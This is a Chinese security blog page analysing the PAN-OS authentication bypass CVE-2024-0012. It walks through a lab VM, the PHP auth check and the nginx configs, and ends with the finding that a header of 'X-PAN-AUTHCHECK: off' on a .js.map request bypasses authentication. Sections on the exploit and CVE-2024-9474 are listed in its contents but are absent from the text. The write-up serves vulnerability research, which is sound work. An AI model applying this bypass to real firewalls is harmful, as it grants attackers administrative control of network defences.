<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="CVE-2024-0012漏洞描述Palo Alto Networks PAN-OS 软件中的身份验证绕过功能使未经身份验证的攻击者能够通过网络访问管理 Web 界面，从而获得 PAN-OS 管理员权限，以执行管理作、篡改配置或利用其他经过身份验证的权限提升漏洞，如 CVE-2024-9474。 影响范围 环境搭建 https:&#x2F;&#x2F;blog.51cto.com&#x2F;jianghxa&#x2F;5268509 注">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2024-0012&#x2F;9474 PAN-OS 身份验证绕过+RCE">
<meta property="og:url" content="http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/index.html">
<meta property="og:site_name" content="k0mor3b1">
<meta property="og:description" content="CVE-2024-0012漏洞描述Palo Alto Networks PAN-OS 软件中的身份验证绕过功能使未经身份验证的攻击者能够通过网络访问管理 Web 界面，从而获得 PAN-OS 管理员权限，以执行管理作、篡改配置或利用其他经过身份验证的权限提升漏洞，如 CVE-2024-9474。 影响范围 环境搭建 https:&#x2F;&#x2F;blog.51cto.com&#x2F;jianghxa&#x2F;5268509 注">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/image-20250223191348418.png">
<meta property="og:image" content="http://example.com/images/image-20250223191542053.png">
<meta property="og:image" content="http://example.com/images/kYmM2YTYwYzViYmViODBkNDlmM111">
<meta property="og:image" content="http://example.com/images/kYmM2YTYwYzViYmViODBkNDlmM112">
<meta property="og:image" content="http://example.com/images/kYmM2YTYwYzViYmViODBkNDlmM113">
<meta property="og:image" content="http://example.com/images/kYmM2YTYwYzViYmViODBkNDlmM114">
<meta property="og:image" content="http://example.com/images/kYmM2YTYwYzViYmViODBkNDlmM115">
<meta property="og:image" content="http://example.com/images/kYmM2YTYwYzViYmViODBkNDlmM116">
<meta property="og:image" content="http://example.com/images/kYmM2YTYwYzViYmViODBkNDlmM117">
<meta property="og:image" content="http://example.com/images/kYmM2YTYwYzViYmViODBkNDlmM118">
<meta property="og:image" content="http://example.com/images/image-20250223192327631.png">
<meta property="og:image" content="http://example.com/images/kYmM2YTYwYzViYmViODBkNDlmM11119">
<meta property="og:image" content="http://example.com/images/kYmM2YTYwYzViYmViODBkNDlmM11120">
<meta property="og:image" content="http://example.com/images/kYmM2YTYwYzViYmViODBkNDlmM121">
<meta property="article:published_time" content="2025-02-17T00:00:00.000Z">
<meta property="article:modified_time" content="2025-02-23T11:25:57.765Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/image-20250223191348418.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/k0mor3b1">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/02/19/2025-02-19-CVE-2025-0108%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/02/08/2025-02-08-CVE-2025-0282%20Ivanti%20%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&text=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&title=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&is_video=false&description=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE&body=Check out this article: http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&title=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&title=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&title=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&title=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&name=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&t=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-0012"><span class="toc-number">1.</span> <span class="toc-text">CVE-2024-0012</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.6.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-9474"><span class="toc-number">2.</span> <span class="toc-text">CVE-2024-9474</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="toc-number">2.2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-1"><span class="toc-number">2.4.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.5.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">John Doe</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-02-17T00:00:00.000Z" class="dt-published" itemprop="datePublished">2025-02-17</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="CVE-2024-0012"><a href="#CVE-2024-0012" class="headerlink" title="CVE-2024-0012"></a>CVE-2024-0012</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Palo Alto Networks PAN-OS 软件中的身份验证绕过功能使未经身份验证的攻击者能够通过网络访问管理 Web 界面，从而获得 PAN-OS 管理员权限，以执行管理作、篡改配置或利用其他经过身份验证的权限提升漏洞，如 CVE-2024-9474。</p>
<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><img src="/images/image-20250223191348418.png" alt="image-20250223191348418"></p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><img src="/images/image-20250223191542053.png" alt="image-20250223191542053"></p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/jianghxa/5268509">https://blog.51cto.com/jianghxa/5268509</a></p>
<p>注意：登录后需要设置密码，密码复杂度如：<code>Zxcasdqwe123#</code></p>
<p><img src="/images/kYmM2YTYwYzViYmViODBkNDlmM111" alt="img"></p>
<p>查看<code>IP</code>，<code>show interface management</code></p>
<p><img src="/images/kYmM2YTYwYzViYmViODBkNDlmM112" alt="img"></p>
<p>默认开始<code>ssh</code>，但是是<code>CLI</code></p>
<p><img src="/images/kYmM2YTYwYzViYmViODBkNDlmM113" alt="img"></p>
<p>查看端口发现开放了<code>443</code>，但没有开放<code>80</code>，因此访问<code>web</code>端需要注意<code>https</code></p>
<p><img src="/images/kYmM2YTYwYzViYmViODBkNDlmM114" alt="img"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>该防火墙里面有很多<code>php</code>文件，分析<code>php.ini</code>文件，通过find命令查找发现有很多<code>php.ini</code>文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@PA-VM /]<span class="meta"># find | grep php.ini</span></span><br><span class="line">find | grep php.ini</span><br><span class="line">./var/appweb/htdocs/vendor/mongodb/mongodb/.evergreen/config/php.ini</span><br><span class="line">./etc/php.ini</span><br><span class="line">./etc/httpd/mgmtui/php.ini</span><br><span class="line">./etc/appweb3/sslvpn/php.ini</span><br><span class="line">./etc/appweb3/l3svc/php.ini</span><br><span class="line">./opt/plugins/etc/php.ini</span><br><span class="line">./opt/plugins/usr/share/doc/php-common/php.ini-production</span><br><span class="line">./opt/plugins/usr/share/doc/php-common/php.ini-development</span><br><span class="line">./usr/share/doc/php-common/php.ini-production</span><br><span class="line">./usr/share/doc/php-common/php.ini-development</span><br><span class="line">./usr/lib32/php.ini</span><br><span class="line">./usr/lib/php.ini</span><br></pre></td></tr></table></figure>

<p>此时，执行下面，然后<code>get</code>请求<code>k0mor3b1.php</code>文件可以看到，配置文件是<code>/etc/httpd/mgmtui/php.ini</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> &gt; /var/appweb/htdocs/unauth/k0mor3b1.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/kYmM2YTYwYzViYmViODBkNDlmM115" alt="img"></p>
<p>分析<code>/etc/httpd/mgmtui/php.ini</code>文件发现下面配置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = uiEnvSetup.php ; PAN-MODIFIED</span><br></pre></td></tr></table></figure>

<p>**<code>auto_prepend_file</code>**<strong>关键字</strong></p>
<ul>
<li><code>PHP</code> 会在执行<strong>每个脚本前</strong>自动加载指定的文件（此处为 <code>uiEnvSetup.php</code>），相当于在所有 <code>PHP</code> 文件开头隐式插入 <code>require_once(&#39;uiEnvSetup.php&#39;)</code>。</li>
<li>典型用途：全局初始化环境变量、预加载公共函数库、开启安全过滤、设置数据库连接池或注入统一的 <code>HTTP</code> 头。</li>
</ul>
<p>查找<code>uiEnvSetup.php</code>文件，发现有两个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@PA-VM /]<span class="meta"># find | grep uiEnvSetup.php</span></span><br><span class="line">./var/appweb/htdocs/phpincludes/uiEnvSetup.php</span><br><span class="line">./opt/plugins/var/appweb/htdocs/phpincludes/uiEnvSetup.php</span><br></pre></td></tr></table></figure>

<p>通过上面获取的<code>phpinfo</code>去查看<code>include_path</code>确定目录顺序查找文件的优先级</p>
<p><img src="/images/kYmM2YTYwYzViYmViODBkNDlmM116" alt="img"></p>
<p>查看<code>./var/appweb/htdocs/phpincludes/uiEnvSetup.php</code>文件，重点关注里面会话和身份验证处理部分</p>
<p>只有当以下条件都满足时才会进行会话鉴权：</p>
<ol>
<li><code>HTTP_X_PAN_AUTHCHECK</code> 的值不等于 <code>off</code>。</li>
<li>请求的脚本路径 (<code>PHP_SELF</code>) 既不等于 <code>/CA/ocsp</code>，也不等于 <code>/php/login.php</code>。</li>
<li>请求的 IP (<code>REMOTE_HOST</code>) 不包含 <code>127.0.0.1</code>。</li>
</ol>
<p>因此，只要有任意一个条件不满足（例如 <code>HTTP_X_PAN_AUTHCHECK</code> 为 <code>off</code>、请求路径是 <code>/CA/ocsp</code> 或 <code>/php/login.php</code>，或者请求来自 <code>127.0.0.1</code>），就不会触发会话身份鉴权流程。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[root@PA-VM /]<span class="comment"># cat ./var/appweb/htdocs/phpincludes/uiEnvSetup.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_core</span>\<span class="title">Container</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_core</span>\<span class="title">Lifecycle</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_core</span>\<span class="title">Str</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_fs</span>\<span class="title">FS</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_log</span>\<span class="title">Log</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_store</span>\<span class="title">Store</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">panui_core</span>\<span class="title">http</span>\<span class="title">WebSession</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">//会话和身份验证处理</span></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_PAN_AUTHCHECK&#x27;</span>] != <span class="string">&#x27;off&#x27;</span></span><br><span class="line">    &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] !== <span class="string">&#x27;/CA/ocsp&#x27;</span></span><br><span class="line">    &amp;&amp;  <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] !== <span class="string">&#x27;/php/login.php&#x27;</span></span><br><span class="line">    &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_HOST&#x27;</span>], <span class="string">&#x27;127.0.0.1&#x27;</span>) === <span class="literal">false</span></span><br><span class="line">) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;PAN_SESSION_READONLY&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$ws</span> = <span class="title class_">WebSession</span>::<span class="title function_ invoke__">getInstance</span>(<span class="variable">$ioc</span>);</span><br><span class="line">    <span class="variable">$ws</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line">    <span class="variable">$ws</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="comment">// these are horrible hacks.</span></span><br><span class="line">    <span class="comment">// This whole code should be removed and only make available to a few pages: main, debug, etc.</span></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        !<span class="title class_">Str</span>::<span class="title function_ invoke__">startsWith</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>], <span class="string">&#x27;/php-packages/panorama_webui/php/api/index.php&#x27;</span>)</span><br><span class="line">        &amp;&amp; !<span class="title class_">Str</span>::<span class="title function_ invoke__">startsWith</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>], <span class="string">&#x27;/php-packages/firewall_webui/php/api/index.php&#x27;</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Backend</span>::<span class="title function_ invoke__">quickSessionExpiredCheck</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])) &#123;</span><br><span class="line">                <span class="title class_">Util</span>::<span class="title function_ invoke__">login</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title class_">Util</span>::<span class="title function_ invoke__">login</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过查找<code>X-pan-AuthCheck</code>找到了<code>etc/nginx/conf/proxy_default.conf</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@PA-VM /]# cat etc/nginx/conf/proxy_default.conf</span><br><span class="line"># default proxy request header setting</span><br><span class="line">proxy_set_header Host $host;</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header X-Real-Scheme $scheme;</span><br><span class="line">proxy_set_header X-Real-Port $server_port;</span><br><span class="line">proxy_set_header X-Real-Server-IP $server_addr;</span><br><span class="line">proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;</span><br><span class="line">proxy_set_header X-pan-ndpp-mode $pan_ndpp_mode;</span><br><span class="line">proxy_set_header Proxy &quot;&quot;;</span><br><span class="line">proxy_set_header X-pan-AuthCheck $panAuthCheck;</span><br></pre></td></tr></table></figure>

<p>继续跟进<code>panAuthCheck</code>，找到了<code>etc/nginx/conf/locations.conf</code>文件</p>
<p><code>$panAuthCheck</code> 为 <code>off</code> 的情况包括：</p>
<ul>
<li>请求路径以 <code>/unauth/</code> 开头。</li>
<li>请求路径是 <code>/php/logout.php</code>。</li>
<li>默认<code>$panAuthCheck</code> 为 <code>on</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@PA-VM /]# cat etc/nginx/conf/locations.conf</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Chrome cache large <span class="built_in">source</span> map making them out of <span class="built_in">date</span>.</span></span><br><span class="line">location ~ \.js\.map$ &#123;</span><br><span class="line">  add_header Cache-Control &quot;no-cache; no-store&quot;;</span><br><span class="line">  proxy_pass_header Authorization;</span><br><span class="line">  proxy_pass http://$gohost$gohostExt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">turn on auth check by default</span></span><br><span class="line">set $panAuthCheck &#x27;on&#x27;;</span><br><span class="line"></span><br><span class="line">if ($uri ~ ^\/unauth\/.+$) &#123;</span><br><span class="line">  set $panAuthCheck &#x27;off&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($uri = /php/logout.php) &#123;</span><br><span class="line">  set $panAuthCheck &#x27;off&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>对<code>.js.map</code>的请求进行详细分析如下：</p>
<p><strong><code>add_header Cache-Control &quot;no-cache; no-store&quot;;</code></strong></p>
<ul>
<li><strong><code>add_header</code></strong>: 这个指令用于添加 HTTP 响应头。它会向响应中添加 <code>Cache-Control</code> 头部。</li>
<li><strong><code>Cache-Control &quot;no-cache; no-store&quot;</code></strong>:<ul>
<li><code>no-cache</code> 表示即使缓存内容存在，浏览器在使用缓存的内容之前，仍需向服务器进行验证。</li>
<li><code>no-store</code> 表示浏览器不应该缓存响应内容，确保每次请求都从服务器获取最新的数据。</li>
</ul>
</li>
</ul>
<p><strong><code>proxy_pass_header Authorization;</code></strong></p>
<ul>
<li><strong><code>proxy_pass_header</code></strong>: 这个指令将特定的 HTTP 头传递给后端服务器。在这种情况下，它传递了 <code>Authorization</code> 头部。</li>
<li><code>Authorization</code> 头用于传递认证信息，通常用于身份验证（如基本认证或 <code>Bearer Token</code>）。将这个头部转发给后端服务器可以确保后端在处理请求时拥有相同的认证信息。</li>
</ul>
<p><strong><code>proxy_pass http://$gohost$gohostExt;</code></strong></p>
<ul>
<li><strong><code>proxy_pass</code></strong>: 这个指令将请求代理到指定的后端服务器。<code>proxy_pass</code> 后面跟的是一个 <code>URL</code>，指示请求应该转发到哪里。</li>
<li><code>$$gohos$$gohostExt</code>: 这两个变量可能在其他地方定义，<code>$gohost</code> 是主机名（可能是服务器的主机名或 <code>IP</code> 地址），而 <code>$gohostExt</code> 可能是端口或其他附加信息（例如扩展名或路径）。这两个变量的值将共同构成完整的后端地址。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.js\.map$ &#123;</span><br><span class="line">  add_header Cache-Control &quot;no-cache; no-store&quot;;</span><br><span class="line">  proxy_pass_header Authorization;</span><br><span class="line">  proxy_pass http://$gohost$gohostExt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，当对<code>.js.map</code>的请求头包含<code>X-PAN-AUTHCHECK: off</code>时，即可绕过鉴权</p>
